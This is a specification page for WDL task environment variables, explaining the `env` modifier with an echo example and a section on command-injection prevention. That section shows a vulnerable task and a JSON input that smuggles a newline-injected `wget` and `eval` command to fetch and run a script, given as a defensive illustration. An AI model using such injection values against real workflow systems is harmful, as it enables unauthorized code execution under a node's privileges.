+++
title = "Environment Variables"
description = "Using environment variables in task execution"
weight = 30
+++

Any input to a task may be converted into an environment variable that will be accessible from within the task's
shell environment during command execution. Unlike inputs, environment variables are not interpolated in the command when
preparing the execution script, but are actually available at runtime directly from the environment. They may be accessed using
normal shell variable access semantics (i.e. `$FOO` or `${FOO}`).

In order to access an input value as an environment variable, you can add the `env` modifier preceding a declaration anywhere
within the task. This applies to declarations within the input section as well as [private declarations](@/tasks/private-declarations.md). An important thing to note is that while the `env` modifier makes the declaration available in the
environment, it does not change its access to normal WDL expressions within a command. That means you can refer to a declaration
annotated with `env` either through the shell semantics (`${FOO}`) or through normal WDL semantics (`~{FOO}`).

When an input is annotated with `env` it is the engine's responsibility to serialize the value appropriately into a string (see section on [Serialization of WDL values](@/appendices/appendix-a.md))
that will then be set as an environment variable. Engines may impose limits on the total length a single environment variable is allowed to occupy as well as the number of environment variables that are allowed to be passed into a single task.
If such limitations exist, it is the engine's responsibility to provide clear documentation outlining what they are for the user.

The environment variable should be evaluated by the engine prior to injecting it into the execution environment. if the task is run in a container the env var is "injected" into the container and not applied to the shell on the host that runs the container.


<details>
<summary>
Example: environment_variable_should_echo.wdl

```wdl
version 1.2

task test {
  input {
    env String greeting
  }

  command <<<
    echo $greeting
  >>>

  output {
    String out = read_string(stdout())
  }
}

workflow environment_variable_should_echo {
  input {
    String greeting
  }

  call test {
    input: greeting = greeting
  }

  output {
    String out = test.out
  }
}
```
</summary>
<p>
Example input:

  ```json
  {
    "environment_variable_should_echo.greeting": "hello"
  }
  ```

  Example output:

  ```json
  {
    "environment_variable_should_echo.out": "hello"
  }
  ```
</p>
</details>

## String Escaping and Injection Prevention
Environment variables provide a mechanism to pass a value to a command which would otherwise be considered unsafe.

For example, in some cloud environments, any code run within a task is given the same identity and permissions as the node that the task is running
on, without needing to perform any additional authentication mechanisms. A bad actor could construct a string to pass into a task
which then performs a privileged operation as the node's identity. It's important to note that this can happen **even if**
only validated workflows are allowed by the execution engine (Which is possibly the case when dealing with restricted data).


Imagine the task looks something like the following:

```wdl
task some_task {
  input {
    String thing_to_do
  }

  command <<<
   echo ${thing_to_do}
  >>>
```

You could then construct an input that downloads a file, and attempts to gain access to anything that the said node has access to.

```json
{
  "some_workflow.some_task":"\nwget bad-script.sh && eval bad-script.sh"
}
```
While the example above illustrates how a user of workflow may submit a bad value, there could possibly be many other sources of injection attacks. As workflows become dependent on other community generated workflows and files, it becomes quite easy to generate a source of an attack to perform some nefarious purpose.

Using environment variables mitigates this problem almost entirely. When a value is declared with the `env` modifier, it becomes the execution engine's responsibility to escape the string thus preventing any sort of interpolation. Functionally, using an environment variable is the same as first escaping the string of any special characters and then wrapping it single quotes.

```
single_quote(escape(${variable}))
```
